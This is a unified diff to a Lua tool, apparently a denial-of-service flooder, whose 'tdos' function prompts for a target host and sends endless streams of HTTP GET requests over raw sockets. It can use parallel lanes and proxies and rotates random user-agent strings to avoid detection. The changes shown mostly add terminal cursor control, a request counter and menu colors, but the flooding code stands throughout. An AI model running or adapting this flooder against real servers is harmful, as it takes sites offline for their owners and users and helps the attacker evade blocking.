@@ -121,8 +121,10 @@ end
 --]]
 local function tdos()
     colord:reset()
+    colord:cursorsethome()
     colord:erasesavedL()
     colord:eraseall()
+    local count = 1
     io.write("Target : ")
     local inputhost = io.read()
     if config.tdosportdefault == "https" then
@@ -144,6 +146,7 @@ local function tdos()
             exit()
         end
     end
+    colord:cursaveposDEC()
     if config.uselanes then
         while true do
             if config.useproxies then
@@ -155,18 +158,20 @@ local function tdos()
                                         local useragent = require("useragent")
                                         for i = 1, 10 do
                                             local tcp = assert(socket.connect(tostring(inputhost), tonumber(inputport)))
+                                            colord:curtosaveDEC()
                                             tcp:send("GET / HTTP/1.1\r\n".."Host: "..string.format("%s:%d",tostring(inputhost),tonumber(inputport)).."\r\nUser-Agent: "..useragent.ua[math.random(1,997)].."\r\n".."Connection: close\r\n\r\n")
                                             tcp:close()
-                                            io.write("send ".. inputhost.."\n")
+                                            colord:curtosaveDEC()
+                                            io.write(string.format(colord:eraseinline().."send to %s:%d times: %d",inputhost,inputport,count))
                                         end
                                     end)()
+                    count = count + 1
                 end
                 for i = 1, #activelanes do  --free
                     local sellanes = activelanes[i]
                     sellanes:cancel()
                     sellanes:join()
                     activelanes[i] = nil
-                    io.write("send "..#activelanes.."\n")
                 end
                 collectgarbage("collect")
             end
@@ -180,8 +185,10 @@ local function tdos()
                         local tcp = assert(socket.connect(tostring(inputhost), tonumber(inputport)))
                         tcp:send("GET / HTTP/1.1\r\n".."Host: "..string.format("%s:%d",tostring(inputhost),tonumber(inputport)).."\r\nUser-Agent: "..useragent.ua[math.random(1,997)].."\r\n".."Connection: close\r\n\r\n")
                         tcp:close()
-                        io.write("send ".. inputhost.."\n")
+                        colord:curtosaveDEC()
+                        io.write(string.format(colord:eraseinline().."send to %s:%d times: %d",inputhost,inputport,count))
                     end
+                    count = count + 1
                 end
             end
     end
@@ -220,15 +227,15 @@ local function tui()
         colord:eraseall()
         io.write(colord:b256setcolor(211,"fg")..branding..colord:reset())
         io.flush()
-        io.write("Tools:\n")
+        io.write(colord:b256setcolor(213,"fg").."Tools:\n")
         local count = 1 --dynamically count choice (this is stupid)
         local idn = {} -- this would dynamically list choice
         for i, v in pairs(tchoice) do --choice (tui)
-            io.write(string.format("    "..colord:b256setcolor(221,"fg").."%d."..colord:b256setcolor(223,"fg").."%s   "..colord:reset().."-"..colord:b256setcolor(226,"fg").."   %s\n"..colord:reset(),count,i,v))
+            io.write(string.format("    "..colord:b256setcolor(218,"fg").."%d : "..colord:b256setcolor(218,"fg").."%s   "..colord:reset().."-"..colord:b256setcolor(218,"fg").."   %s\n"..colord:reset(),count,i,v))
             count = count + 1
             table.insert(idn,i)
         end
-        io.write("choice:")
+        io.write(colord:b256setcolor(213,"fg").."choice : "..colord:reset())
         local input = io.read()
         if tonumber(input) == nil then
             warn("numbers please.\n")
